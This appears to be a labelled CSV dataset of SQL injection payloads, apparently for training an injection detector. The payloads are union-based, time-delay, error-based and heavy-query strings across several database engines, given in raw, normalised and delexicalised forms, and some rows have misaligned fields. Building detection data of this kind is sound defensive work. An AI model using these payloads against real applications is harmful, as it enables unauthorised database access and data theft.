payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,1,sqli_dataset.csv,,False,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'lnte' = 'lnte,<NUM><STR>lnte<STR>lnte
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1' ) ) union all select null,null,null,null,null,null,null,null,null--","<NUM>' ) ) union all select null,null,null,null,null,null,null,null,null--"
"-8636""   )    )     )   union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1,sqli_dataset.csv,,False,"-8636"" ) ) ) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-6940'  )   union all select 3042,3042,3042,3042,3042#",1,sqli_dataset.csv,,False,"-6940' ) union all select 3042,3042,3042,3042,3042#","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM>"" ) as rnjx where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
1  )   as qgsb where 7600  =  7600 and 2006  =  2006,1,sqli_dataset.csv,,False,1 ) as qgsb where 7600 = 7600 and 2006 = 2006,<NUM> ) as qgsb where <NUM> = <NUM> and <NUM> = <NUM>
1' where 4795  =  4795 and 4595  =  4595#,1,sqli_dataset.csv,,False,1' where 4795 = 4795 and 4595 = 4595#,<NUM>' where <NUM> = <NUM> and <NUM> = <NUM>#
"1""  )   as rnte where 6517  =  6517 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>"" ) as rnte where <NUM> = <NUM> and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1,sqli_dataset.csv,,False,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )","<NUM>"" and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric )"
"1  )   as ghew where 6441  =  6441 union all select null,null--",1,sqli_dataset.csv,,False,"1 ) as ghew where 6441 = 6441 union all select null,null--","<NUM> ) as ghew where <NUM> = <NUM> union all select null,null--"
"-2548""   )    )     )   or 5107  =  8049--",1,sqli_dataset.csv,,False,"-2548"" ) ) ) or 5107 = 8049--","-<NUM>"" ) ) ) or <NUM> = <NUM>--"
1' order by 1#,1,sqli_dataset.csv,,False,1' order by 1#,<NUM>' order by <NUM>#
"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sqli_dataset.csv,,False,"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --","<NUM>"" ) where <NUM> = <NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from information_schema.system_users ) --"
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",1,sqli_dataset.csv,,False,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",1,sqli_dataset.csv,,False,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""pxix"" = ""pxix",<NUM><STR>pxix<STR>pxix
"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>%' and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",1,sqli_dataset.csv,,False,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'xngr' = 'xngr",<NUM><STR>xngr<STR>xngr
"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",1,sqli_dataset.csv,,False,"-6514 ) ) as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--","-<NUM> ) ) as pbgg where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--"
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",1,sqli_dataset.csv,,False,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",<NUM><STR>twmy<STR>twmy
select case when 6420  =  7941 then 1 else null end--,1,sqli_dataset.csv,,False,select case when 6420 = 7941 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--
"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sqli_dataset.csv,,True,"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --","<NUM>"" ) ) as qvyu where <NUM> = <NUM> or updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --"
1'  )   and 4595  =  4595#,1,sqli_dataset.csv,,False,1' ) and 4595 = 4595#,<NUM>' ) and <NUM> = <NUM>#
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM><STR>ersu' where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"1%' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>%' or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  5432  =  5432",1,sqli_dataset.csv,,False,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( <NUM> = <NUM>"
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",1,sqli_dataset.csv,,True,"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bxcb"" like ""bxcb",<NUM><STR>bxcb<STR>bxcb
"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",1,sqli_dataset.csv,,True,"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",<NUM><STR>iyvn<STR>
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'qgov'  =  'qgov",1,sqli_dataset.csv,,False,"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'qgov' = 'qgov",<NUM><STR>qgov<STR>qgov
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,sqli_dataset.csv,,True,"1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )","<NUM>,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) )"
"1"" where 8727  =  8727",1,sqli_dataset.csv,,False,"1"" where 8727 = 8727","<NUM>"" where <NUM> = <NUM>"
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,1,sqli_dataset.csv,,False,select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,select sleep ( <NUM> ) and ( ( <STR> like 'mmvf
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,sqli_dataset.csv,,True,"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",<NUM><STR>jpso<STR>
-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,1,sqli_dataset.csv,,False,-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,-<NUM> ) ) or <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) and ( ( <NUM> = <NUM>
"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1,sqli_dataset.csv,,False,"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1,sqli_dataset.csv,,False,"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--","-<NUM>"" where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sqli_dataset.csv,,False,"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --","<NUM>"" where <NUM> = <NUM> and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --"
"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz",1,sqli_dataset.csv,,False,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",<NUM><STR>dhqz<STR>dhqz
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",1,sqli_dataset.csv,,False,"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",<NUM><STR>mrsl<STR>mrsl
"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",1,sqli_dataset.csv,,False,"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#","-<NUM> ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1,sqli_dataset.csv,,False,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#","-<NUM>%"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sqli_dataset.csv,,False,-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,-<NUM>' ) ) as bgpp where <NUM> = <NUM> or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) --
"-8491"" where 6107  =  6107 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,sqli_dataset.csv,,False,"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --","-<NUM>"" where <NUM> = <NUM> or <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --"
"-5910%'   )    )     )   union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1,sqli_dataset.csv,,False,"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--","-<NUM>%' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#","<NUM>"" where <NUM> = <NUM> union all select null,null,null,null,null,null,null#"
-7940'  )   union all select 6024--,1,sqli_dataset.csv,,False,-7940' ) union all select 6024--,-<NUM>' ) union all select <NUM>--
"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1"" ) where 2758 = 2758 union all select null,null,null,null,null,null,null--","<NUM>"" ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null--"
1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',1,sqli_dataset.csv,,False,1%' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and '%' = ',<NUM>%<STR>%<STR>
"1%""   )    )     )   union all select null#",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null#","<NUM>%"" ) ) ) union all select null#"
"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) ) ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) --,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) --
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1,sqli_dataset.csv,,False,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#","-<NUM>%"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' ) as ywtu where <NUM> = <NUM> or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"-9622' union all select 7208,7208,7208,7208#",1,sqli_dataset.csv,,False,"-9622' union all select 7208,7208,7208,7208#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>#"
1'||  (  select 'jmao' where 3009  =  3009,1,sqli_dataset.csv,,False,1'|| ( select 'jmao' where 3009 = 3009,<NUM><STR>jmao' where <NUM> = <NUM>
"1  )   where 4698  =  4698 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1,sqli_dataset.csv,,False,"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",<NUM><STR>rfjl<STR>
"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",1,sqli_dataset.csv,,False,"1', ( select ( case when ( 6894 = 6087 ) then 1 else 6894* ( select 6894 from information_schema.character_sets ) end ) )","<NUM>', ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) )"
"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1 ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM> ) ) ) and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1""  )   where 9285  =  9285 and 8506  =  8343#",1,sqli_dataset.csv,,False,"1"" ) where 9285 = 9285 and 8506 = 8343#","<NUM>"" ) where <NUM> = <NUM> and <NUM> = <NUM>#"
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',1,sqli_dataset.csv,,True,1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',<NUM><STR>
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and <STR> = 'fdgq
-6200%'   )    )    or 8077  =  4661,1,sqli_dataset.csv,,False,-6200%' ) ) or 8077 = 4661,-<NUM>%' ) ) or <NUM> = <NUM>
1  )   rlike sleep  (  5  )  #,1,sqli_dataset.csv,,False,1 ) rlike sleep ( 5 ) #,<NUM> ) rlike sleep ( <NUM> ) #
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",1,sqli_dataset.csv,,False,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual--"
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1,sqli_dataset.csv,,False,1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,<NUM> ) ) ) and sleep ( <NUM> ) and ( ( ( <NUM> = <NUM>
